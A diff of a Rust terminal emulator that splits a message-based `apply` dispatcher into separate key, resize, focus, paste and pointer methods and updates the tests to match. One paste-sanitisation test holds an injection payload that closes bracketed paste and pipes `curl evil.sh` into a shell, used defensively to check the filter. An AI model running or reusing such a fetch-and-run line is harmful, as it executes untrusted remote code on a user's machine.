@@ -5,15 +5,15 @@
 //! Wayland, xkb, or the GPU.
 //!
 //! ```text
-//!   ToTerminal ─▶ TerminalCore::apply ─┬─▶ PTY write   (input → child)
-//!                                      └─▶ grid mutate  (parser, selection, scroll)
+//!   key / paste / pointer ─┬─▶ PTY write    (input → child)
+//!   resize / focus         └─▶ grid mutate  (parser, selection, scroll)
 //!   PTY master ─▶ gather thread ─▶ pump ─▶ parser ─▶ grid ─▶ outbox (Title / Closed)
 //!   grid state ─▶ fill_frame_list ─▶ DisplayList (pulled by the window each frame)
 //! ```
 //!
-//! [`crate::app::tabs::Tabs`] drives each core on the main thread: it routes the
-//! window's [`ToTerminal`] messages to the active core (or resize to all cores),
-//! pulls only the active [`DisplayList`], and translates each per-core
+//! [`crate::app::tabs::Tabs`] drives each core on the main thread: it routes input to
+//! the active core (and a resize to all of them), pulls only the active
+//! [`DisplayList`], and translates each per-core
 //! [`ToWindow`] fact. The child's output is drained off-thread by [`crate::gather`] (see
 //! off-thread); `pump` consumes the published batches. Only
 //! reads move off the main thread; the parser, grid, and every write stay here.
@@ -23,7 +23,7 @@ use std::rc::Rc;
 use std::time::{Duration, Instant};
 
 use crate::app::layout::TerminalGeometry;
-use crate::app::message::{PointerEvent, Side, ToTerminal, ToWindow};
+use crate::app::message::{PointerEvent, Side, ToWindow};
 use crate::color::Theme;
 use crate::config::TabBarConfig;
 use crate::error::Result;
@@ -203,10 +203,11 @@ pub(super) struct PumpOutcome {
 }
 
 /// The terminal half of the app: the PTY, parser, and grid, plus the state that
-/// is a pure function of them. The window feeds it [`ToTerminal`] messages, pulls
-/// a [`DisplayList`], and drains the [`ToWindow`] outbox. It holds its own copies
-/// of the frame geometry (`metrics`/`width`/`height`/`pad`); the window computes
-/// them (it owns the fonts and scale) and ships them over on a [`ToTerminal::Resize`].
+/// is a pure function of them. The window drives it through [`Self::key`],
+/// [`Self::paste`], [`Self::pointer`], [`Self::focus`] and [`Self::resize`], pulls a
+/// [`DisplayList`], and drains the [`ToWindow`] outbox. It holds its own copy of the
+/// frame geometry; the window computes it (it owns the fonts and scale) and ships it
+/// over on a [`resize`](Self::resize).
 pub(super) struct TerminalCore {
     /// The grid being shown, always sized to the current window's `(cols, rows)`.
     screen: Screen,
@@ -346,7 +347,7 @@ pub(super) struct TerminalCore {
 }
 
 impl TerminalCore {
-    /// Build the core at the window's current geometry; a later [`ToTerminal::Resize`]
+    /// Build the core at the window's current geometry; a later [`Self::resize`]
     /// keeps it current. Demo mode starts on a static grid; live mode starts blank
     /// until the shell fills it.
     pub(super) fn new(demo: bool, geom: TerminalGeometry) -> Self {
@@ -623,137 +624,141 @@ impl TerminalCore {
         std::mem::take(&mut self.outbox)
     }
 
-    /// Apply a [`ToTerminal`] message: the terminal half of the seam, turning
-    /// window intent into PTY bytes and grid mutations. Returns whether the child
-    /// received bytes, which the key path uses to gate auto-repeat.
-    pub(super) fn apply(&mut self, msg: ToTerminal) -> Result<bool> {
-        match msg {
-            ToTerminal::Key { key, mods, event } => {
-                let modes = input::Modes::from_screen(&self.screen);
-                self.key_buf.clear();
-                input::encode_event(key, mods, event, modes, &mut self.key_buf);
-                if self.key_buf.is_empty() {
-                    return Ok(false);
-                }
-                // Typing ends the selection. Gated on the encoder having produced
-                // something, so a key the child will never hear about leaves it alone,
-                // and so do the chords the window swallows before this seam: local
-                // scrollback keys, tab switching, and Ctrl+Shift+C itself, which would
-                // otherwise wipe the selection it was pressed to copy.
-                //
-                // A *release* is excluded, and must be. Under kitty's
-                // `REPORT_EVENT_TYPES` a release encodes to bytes of its own, and
-                // `App::on_key_release` forwards one for every key whose press a binding
-                // consumed — so counting releases as typing would have letting go of
-                // Ctrl+Shift+C undo the copy that pressing it just made.
-                if event != input::KeyEvent::Release {
-                    self.end_selection_on_input();
-                }
-                // Typing snaps the view back to the live bottom before the bytes go
-                // out, so a keystroke never lands "blind" while reading history.
-                if self.screen.is_scrolled() {
-                    self.screen.scroll_view_to_bottom();
-                    self.dirty = true;
-                }
-                self.bump_cursor(); // keep the cursor solid while typing
-                self.send_key_buf()?;
-                Ok(true)
-            }
-            ToTerminal::Pointer { event, mods } => {
-                self.apply_pointer(event, mods)?;
-                Ok(false)
-            }
-            ToTerminal::Resize(geom) => {
-                let (cols, rows) = (geom.cols, geom.rows);
-                // Adopt the window's fresh geometry, then resize the grid to it. In
-                // demo mode there is no child; rebuild the static grid. Otherwise
-                // push the size to the child (TIOCSWINSZ → SIGWINCH). The PTY resize
-                // is best-effort: a resize on a dead child just surfaces as EOF on
-                // the next read, which shuts down cleanly.
-                self.geom = geom;
-                if self.demo {
-                    // The grid is replaced wholesale, so no row id minted against the
-                    // old one survives it.
-                    self.screen = demo_screen(cols, rows);
-                    self.set_selection(None);
-                    self.drag = None;
-                } else {
-                    // A width reflow re-wraps the grid and renumbers its rows; the returned
-                    // effect says how to carry the selection over that (a height change leaves
-                    // ids alone). An in-progress drag cannot survive — the button is held on a
-                    // window that is being resized — so it goes regardless.
-                    let effect = self.screen.resize(cols, rows);
-                    self.drag = None;
-                    let carried = self.carry_selection(effect);
-                    self.set_selection(carried);
-                    self.screen.set_pixel_size(geom.width, geom.height);
-                    // Reflow the grid now (above) for smooth visuals, but debounce the child's
-                    // winsize: telling the shell on every configure floods it with prompt
-                    // redraws that mush together under a drag. `flush_winsize_if_due` pushes
-                    // `TIOCSWINSZ` (and the in-band `?2048` report) once it settles.
-                    self.winsize_at = Some(Instant::now() + self.winsize_settle);
-                }
-                // Prune catches the leftover cases the carry does not: a kept selection whose
-                // end row a shrink dropped off the screen.
-                self.prune_selection();
-                self.dirty = true;
-                Ok(false)
-            }
-            ToTerminal::Focus(focused) => {
-                self.focused = focused;
-                // `?1004`: the child asked to be told. Flushed straight away — a focus
-                // change need not be followed by any output, so waiting for the next pump
-                // could sit on it indefinitely.
-                self.screen.report_focus(focused);
-                self.flush_responses()?;
-                if focused {
-                    self.bump_cursor(); // start blinking from a lit cursor
-                } else {
-                    self.blink_at = None; // stop the blink timer while unfocused
-                }
-                self.dirty = true;
-                Ok(false)
-            }
-            ToTerminal::Paste(text) => {
-                let text = String::from_utf8_lossy(&text);
-                if text.is_empty() {
-                    return Ok(false);
-                }
-                // Build the paste straight into the reused key buffer: bracketed-paste
-                // markers when the program enabled them (`?2004`), and the text folded
-                // and filtered by `sanitize_paste`. The filter runs whether or not the
-                // brackets do — a control character is no more welcome in a raw paste —
-                // and it is what keeps the payload from closing the bracket we just
-                // opened. Snaps the view to the bottom, like input.
-                let bracketed = self.screen.bracketed_paste();
-                self.key_buf.clear();
-                if bracketed {
-                    self.key_buf.extend_from_slice(b"\x1b[200~");
-                }
-                sanitize_paste(&mut self.key_buf, &text);
-                if bracketed {
-                    self.key_buf.extend_from_slice(b"\x1b[201~");
-                }
-                // A paste is input like any other, so it ends the selection too. It costs
-                // the middle-click-repeatedly workflow nothing: the primary offer was
-                // handed to the window when the drag ended and stands on its own, so the
-                // highlight going away does not retract what middle-click pastes.
-                self.end_selection_on_input();
-                if self.screen.is_scrolled() {
-                    self.screen.scroll_view_to_bottom();
-                    self.dirty = true;
-                }
-                self.send_key_buf()?;
-                Ok(true)
-            }
+    /// Encode a key press or release for the child and send it. Returns whether it
+    /// produced bytes, which is what gates auto-repeat: a chord the child never hears
+    /// about must not repeat.
+    pub(super) fn key(
+        &mut self,
+        key: input::Key,
+        mods: input::Mods,
+        event: input::KeyEvent,
+    ) -> Result<bool> {
+        let modes = input::Modes::from_screen(&self.screen);
+        self.key_buf.clear();
+        input::encode_event(key, mods, event, modes, &mut self.key_buf);
+        if self.key_buf.is_empty() {
+            return Ok(false);
         }
+        // Typing ends the selection. Gated on the encoder having produced
+        // something, so a key the child will never hear about leaves it alone,
+        // and so do the chords the window swallows before this seam: local
+        // scrollback keys, tab switching, and Ctrl+Shift+C itself, which would
+        // otherwise wipe the selection it was pressed to copy.
+        //
+        // A *release* is excluded, and must be. Under kitty's
+        // `REPORT_EVENT_TYPES` a release encodes to bytes of its own, and
+        // `App::on_key_release` forwards one for every key whose press a binding
+        // consumed — so counting releases as typing would have letting go of
+        // Ctrl+Shift+C undo the copy that pressing it just made.
+        if event != input::KeyEvent::Release {
+            self.end_selection_on_input();
+        }
+        // Typing snaps the view back to the live bottom before the bytes go
+        // out, so a keystroke never lands "blind" while reading history.
+        if self.screen.is_scrolled() {
+            self.screen.scroll_view_to_bottom();
+            self.dirty = true;
+        }
+        self.bump_cursor(); // keep the cursor solid while typing
+        self.send_key_buf()?;
+        Ok(true)
+    }
+
+    /// Adopt the window's fresh geometry and resize the grid to it.
+    pub(super) fn resize(&mut self, geom: TerminalGeometry) {
+        let (cols, rows) = (geom.cols, geom.rows);
+        // Adopt the window's fresh geometry, then resize the grid to it. In
+        // demo mode there is no child; rebuild the static grid. Otherwise
+        // push the size to the child (TIOCSWINSZ → SIGWINCH). The PTY resize
+        // is best-effort: a resize on a dead child just surfaces as EOF on
+        // the next read, which shuts down cleanly.
+        self.geom = geom;
+        if self.demo {
+            // The grid is replaced wholesale, so no row id minted against the
+            // old one survives it.
+            self.screen = demo_screen(cols, rows);
+            self.set_selection(None);
+            self.drag = None;
+        } else {
+            // A width reflow re-wraps the grid and renumbers its rows; the returned
+            // effect says how to carry the selection over that (a height change leaves
+            // ids alone). An in-progress drag cannot survive — the button is held on a
+            // window that is being resized — so it goes regardless.
+            let effect = self.screen.resize(cols, rows);
+            self.drag = None;
+            let carried = self.carry_selection(effect);
+            self.set_selection(carried);
+            self.screen.set_pixel_size(geom.width, geom.height);
+            // Reflow the grid now (above) for smooth visuals, but debounce the child's
+            // winsize: telling the shell on every configure floods it with prompt
+            // redraws that mush together under a drag. `flush_winsize_if_due` pushes
+            // `TIOCSWINSZ` (and the in-band `?2048` report) once it settles.
+            self.winsize_at = Some(Instant::now() + self.winsize_settle);
+        }
+        // Prune catches the leftover cases the carry does not: a kept selection whose
+        // end row a shrink dropped off the screen.
+        self.prune_selection();
+        self.dirty = true;
+    }
+
+    /// Keyboard focus gained or lost. The window observes it (Wayland); the terminal
+    /// needs it because the cursor draws solid when focused and hollow when not.
+    pub(super) fn focus(&mut self, focused: bool) -> Result<()> {
+        self.focused = focused;
+        // `?1004`: the child asked to be told. Flushed straight away — a focus
+        // change need not be followed by any output, so waiting for the next pump
+        // could sit on it indefinitely.
+        self.screen.report_focus(focused);
+        self.flush_responses()?;
+        if focused {
+            self.bump_cursor(); // start blinking from a lit cursor
+        } else {
+            self.blink_at = None; // stop the blink timer while unfocused
+        }
+        self.dirty = true;
+        Ok(())
+    }
+
+    /// Paste `bytes` as input: bracketed when the program asked for it (`?2004`), always
+    /// filtered, and snapped to the live bottom like typing.
+    pub(super) fn paste(&mut self, bytes: Vec<u8>) -> Result<()> {
+        let text = String::from_utf8_lossy(&bytes);
+        if text.is_empty() {
+            return Ok(());
+        }
+        // Build the paste straight into the reused key buffer: bracketed-paste
+        // markers when the program enabled them (`?2004`), and the text folded
+        // and filtered by `sanitize_paste`. The filter runs whether or not the
+        // brackets do — a control character is no more welcome in a raw paste —
+        // and it is what keeps the payload from closing the bracket we just
+        // opened. Snaps the view to the bottom, like input.
+        let bracketed = self.screen.bracketed_paste();
+        self.key_buf.clear();
+        if bracketed {
+            self.key_buf.extend_from_slice(b"\x1b[200~");
+        }
+        sanitize_paste(&mut self.key_buf, &text);
+        if bracketed {
+            self.key_buf.extend_from_slice(b"\x1b[201~");
+        }
+        // A paste is input like any other, so it ends the selection too. It costs
+        // the middle-click-repeatedly workflow nothing: the primary offer was
+        // handed to the window when the drag ended and stands on its own, so the
+        // highlight going away does not retract what middle-click pastes.
+        self.end_selection_on_input();
+        if self.screen.is_scrolled() {
+            self.screen.scroll_view_to_bottom();
+            self.dirty = true;
+        }
+        self.send_key_buf()?;
+        Ok(())
     }
 
     /// The terminal half of a pointer event: report it to a program grabbing the
     /// mouse, or drive local selection / scrollback scroll / hyperlinks. The window
     /// already mapped the event to a cell and supplied the modifier chord (Shift
     /// forces local use even while a program is reporting the mouse).
-    fn apply_pointer(&mut self, event: PointerEvent, mods: input::Mods) -> Result<()> {
+    pub(super) fn pointer(&mut self, event: PointerEvent, mods: input::Mods) -> Result<()> {
         let reporting = self.screen.mouse_mode().reports() && !mods.contains(input::Mods::SHIFT);
         match event {
             PointerEvent::Button {
@@ -1703,7 +1708,7 @@ impl TerminalCore {
     /// Whether a program has grabbed the mouse with `?1000`/`?1002`/`?1003`. The window
     /// reads it to drop the I-beam: while a program is reporting, a drag is that
     /// program's to interpret, not a text selection, so the pointer must not promise
-    /// one. Mirrors the `reporting` test in [`Self::apply_pointer`], minus the Shift
+    /// one. Mirrors the `reporting` test in [`Self::pointer`], minus the Shift
     /// override the window applies itself.
     pub(super) fn mouse_reporting(&self) -> bool {
         self.screen.mouse_mode().reports()
@@ -2002,8 +2007,7 @@ mod tests {
         let big = "x".repeat(256 * 1024);
         let start = Instant::now();
         for _ in 0..24 {
-            core.apply(ToTerminal::Paste(big.clone().into_bytes()))
-                .expect("paste");
+            core.paste(big.clone().into_bytes()).expect("paste");
         }
         assert!(
             start.elapsed() < Duration::from_secs(5),
@@ -2025,7 +2029,7 @@ mod tests {
         // And the terminal is still live: it accepts and acts on an event, which is
         // precisely what the frozen version could not do.
         core.dirty = false;
-        core.apply(ToTerminal::Focus(true)).expect("focus");
+        core.focus(true).expect("focus");
         assert!(core.dirty, "the window still responds");
     }
 
@@ -2068,8 +2072,7 @@ mod tests {
         let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.feed_test_bytes(b"\x1b[?2004h"); // the program wants bracketed paste
         let payload = "echo hi\x1b[201~\ncurl evil.sh|sh\n";
-        core.apply(ToTerminal::Paste(payload.as_bytes().to_vec()))
-            .expect("paste");
+        core.paste(payload.as_bytes().to_vec()).expect("paste");
 
         let sent = core.key_buf.clone();
         assert_eq!(
@@ -2744,8 +2747,8 @@ mod tests {
         count: usize,
         side: Side,
     ) {
-        core.apply(ToTerminal::Pointer {
-            event: PointerEvent::Button {
+        core.pointer(
+            PointerEvent::Button {
                 button,
                 pressed,
                 col,
@@ -2753,8 +2756,8 @@ mod tests {
                 count,
                 side,
             },
-            mods: input::Mods::NONE,
-        })
+            input::Mods::NONE,
+        )
         .unwrap();
     }
 
@@ -2763,11 +2766,8 @@ mod tests {
     }
 
     fn drag_in(core: &mut TerminalCore, col: usize, row: usize, side: Side) {
-        core.apply(ToTerminal::Pointer {
-            event: PointerEvent::Motion { col, row, side },
-            mods: input::Mods::NONE,
-        })
-        .unwrap();
+        core.pointer(PointerEvent::Motion { col, row, side }, input::Mods::NONE)
+            .unwrap();
     }
 
     /// What the cells between `a` and `b` hold *now*, which is the thing a capture is
@@ -2797,14 +2797,14 @@ mod tests {
 
     /// Move the pointer to a cell with a modifier chord held.
     fn hover_at(core: &mut TerminalCore, col: usize, row: usize, mods: input::Mods) {
-        core.apply(ToTerminal::Pointer {
-            event: PointerEvent::Motion {
+        core.pointer(
+            PointerEvent::Motion {
                 col,
                 row,
                 side: Side::Left,
             },
             mods,
-        })
+        )
         .unwrap();
     }
 
@@ -2816,8 +2816,8 @@ mod tests {
         row: usize,
         mods: input::Mods,
     ) {
-        core.apply(ToTerminal::Pointer {
-            event: PointerEvent::Button {
+        core.pointer(
+            PointerEvent::Button {
                 button: MouseButton::Left,
                 pressed,
                 col,
@@ -2826,7 +2826,7 @@ mod tests {
                 side: Side::Left,
             },
             mods,
-        })
+        )
         .unwrap();
     }
 
@@ -2857,11 +2857,7 @@ mod tests {
         // And off the grid entirely: an underline must not outlive the pointer.
         hover_at(&mut core, 10, 0, input::Mods::NONE);
         assert!(core.hovering_link());
-        core.apply(ToTerminal::Pointer {
-            event: PointerEvent::Left,
-            mods: input::Mods::NONE,
-        })
-        .unwrap();
+        core.pointer(PointerEvent::Left, input::Mods::NONE).unwrap();
         assert!(!core.hovering_link(), "the pointer left the grid");
     }
 
@@ -3089,11 +3085,7 @@ mod tests {
         // Leaving the grid does the same: coming back to the cell it left from is a new
         // position, because in between the pointer was somewhere else entirely.
         assert!(motion_report(&mut core, 5, 3, Side::Left).is_empty());
-        core.apply(ToTerminal::Pointer {
-            event: PointerEvent::Left,
-            mods: input::Mods::NONE,
-        })
-        .unwrap();
+        core.pointer(PointerEvent::Left, input::Mods::NONE).unwrap();
         assert!(!motion_report(&mut core, 5, 3, Side::Left).is_empty());
     }
 
@@ -3214,11 +3206,11 @@ mod tests {
         select_word(&mut core, 6, 0);
         assert_eq!(copied(&mut core).as_deref(), Some("world"));
 
-        core.apply(ToTerminal::Key {
-            key: input::Key::plain('x'),
-            mods: input::Mods::NONE,
-            event: input::KeyEvent::Press,
-        })
+        core.key(
+            input::Key::plain('x'),
+            input::Mods::NONE,
+            input::KeyEvent::Press,
+        )
         .unwrap();
 
         assert!(core.selection.is_none(), "typing left the highlight up");
@@ -3237,11 +3229,11 @@ mod tests {
         core.take_outbox();
         assert_eq!(copied(&mut core).as_deref(), Some("hello"));
 
-        core.apply(ToTerminal::Key {
-            key: input::Key::plain('x'),
-            mods: input::Mods::NONE,
-            event: input::KeyEvent::Press,
-        })
+        core.key(
+            input::Key::plain('x'),
+            input::Mods::NONE,
+            input::KeyEvent::Press,
+        )
         .unwrap();
 
         assert!(core.selection.is_none(), "typing left the highlight up");
@@ -3259,11 +3251,11 @@ mod tests {
         select_word(&mut core, 6, 0);
 
         let sent = core
-            .apply(ToTerminal::Key {
-                key: input::Key::plain('c'),
-                mods: input::Mods::CTRL | input::Mods::SHIFT,
-                event: input::KeyEvent::Release,
-            })
+            .key(
+                input::Key::plain('c'),
+                input::Mods::CTRL | input::Mods::SHIFT,
+                input::KeyEvent::Release,
+            )
             .unwrap();
 
         assert!(sent, "the release must encode, or this proves nothing");
@@ -3291,7 +3283,7 @@ mod tests {
         let mut core = core_showing("hello world");
         select_word(&mut core, 6, 0);
 
-        core.apply(ToTerminal::Paste(b"ls".to_vec())).unwrap();
+        core.paste(b"ls".to_vec()).unwrap();
 
         assert!(core.selection.is_none());
     }
@@ -3362,8 +3354,7 @@ mod tests {
         let picked = core.selection.expect("word selected");
         assert_eq!(grid_text(&core.screen, picked.anchor, picked.head), "world");
 
-        core.apply(ToTerminal::Resize(geom(40, 12, 40 * 8, 12 * 16)))
-            .unwrap();
+        core.resize(geom(40, 12, 40 * 8, 12 * 16));
 
         let sel = core
             .selection
@@ -3381,8 +3372,7 @@ mod tests {
         core.feed_test_bytes(b"hello world"); // and put a word on it to select
         select_word(&mut core, 6, 0);
         assert!(core.selection.is_some());
-        core.apply(ToTerminal::Resize(geom(40, 12, 40 * 8, 12 * 16)))
-            .unwrap();
+        core.resize(geom(40, 12, 40 * 8, 12 * 16));
         assert!(
             core.selection.is_none(),
             "an alt-screen selection is dropped"
@@ -3608,11 +3598,11 @@ mod tests {
 
         // The one thing that still snaps to the bottom: the user. A keystroke must
         // never land blind in the middle of history.
-        core.apply(ToTerminal::Key {
-            key: input::Key::plain('x'),
-            mods: input::Mods::NONE,
-            event: input::KeyEvent::Press,
-        })
+        core.key(
+            input::Key::plain('x'),
+            input::Mods::NONE,
+            input::KeyEvent::Press,
+        )
         .unwrap();
         assert_eq!(
             core.screen.view_offset(),
@@ -3749,15 +3739,15 @@ mod tests {
         );
 
         // The wheel.
-        core.apply(ToTerminal::Pointer {
-            event: PointerEvent::Wheel {
+        core.pointer(
+            PointerEvent::Wheel {
                 down: false,
                 notches: 1,
                 col: 0,
                 row: 0,
             },
-            mods: input::Mods::NONE,
-        })
+            input::Mods::NONE,
+        )
         .unwrap();
         assert!(core.screen.is_scrolled(), "the wheel scrolled the view");
         assert!(
